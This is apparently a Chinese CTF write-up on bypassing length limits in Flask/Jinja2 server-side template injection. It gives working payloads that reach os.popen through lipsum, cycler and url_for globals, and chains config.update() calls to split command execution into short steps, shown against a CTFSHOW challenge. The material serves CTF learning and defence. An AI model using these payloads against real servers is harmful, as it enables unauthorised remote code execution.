# Py flask SSTI 长度限制绕过

---

起因是做题的时候，发现一道ssti题对长度做了限制，

我尽我所能的去缩短可是最后还是超过长度限制



### 解决方法

#### 使用长度较短的方式

但是有时候也会超出

```(空)
 {{lipsum.__globals__['os'].popen('tac ../flag').read()}}

 
{{cycler.__init__.__globals__.os.popen('ls').read()}}

{{url_for.__globals__.os.popen('ls /').read()}}
```



#### 使用config存储

在 Flask 中，`config` 对象用于保存配置信息，通常用于存储各种设置和参数，如数据库连接字符串、密钥、环境配置等。你可以通过 `app.config` 来访问和设置配置项。

并且`config` 对象实质上是一个字典的子类，可以像字典一样操作

利用`update`可以更新字典

我们将使用 Jinja 模板的 **set 语句**配合字典的 **update() 方法**来更新 **config 全局对象**

```python
{%set x=config.update(a=config.update)%}   
//一个a
{%set x=config.a(f=lipsum.__globals__)%}   
//lipsum.__globals__
{%set x=config.a(o=config.f.os)%}          
//lipsum.__globals__.os
{%set x=config.a(p=config.o.popen)%}       
//lipsum.__globals__.os.popen
{{config.p("cat /flag").read()}}  
```



```python
{%set x=config.update(l=lipsum)%}
 
{%set x=config.update(g=request.args.a)%}&a=__globals__
 
{%set x=config.update(f=config.l|attr(config.g))%}
 
{%set x=config.update(o=config.f.os)%}
 
{%set x=config.update(p=config.o.popen)%}
 
{%print(config.p(request.args.c).read())%}&c=cat /flag
```



```python
{{config.update(l=lipsum)}}
{{config.update(g=request.args.a)}}&a=__globals__
{{config.update(f=config.l)}}
{{config.update(f=f|attr(config.g))}}
{{config.update(f=config.l[config.g])}}
{{config.update(o=config.f.os)}}
{{config.update(p=config.o.popen)}}
{{config.p(request.args.c).read()}}&c=cat /flag
```



同时利用

```python
{%print(config)%}
```

可以查看并且确保值被正确的更新了



### 题目

#### CTFSHOW -单身杯-ezzz——ssti

用户名存在ssti

![image-20250118182208650](https://gitee.com/bx33661/image/raw/master/path/image-20250118182208650.png)

但是我们payload不能太长-最多40个字符

所以才用

```python
{%set x=config.update(a=config.update)%}   
{%set x=config.a(f=lipsum.__globals__)%}   
{%set x=config.a(o=config.f.os)%}          
{%set x=config.a(p=config.o.popen)%}  

{{config.p("ls /").read()}}
{{config.p("cat /flag").read()}}  
```

[Python Flask SSTI 之 长度限制绕过_python绕过长度限制的内置函数-CSDN博客](https://blog.csdn.net/weixin_43995419/article/details/126811287)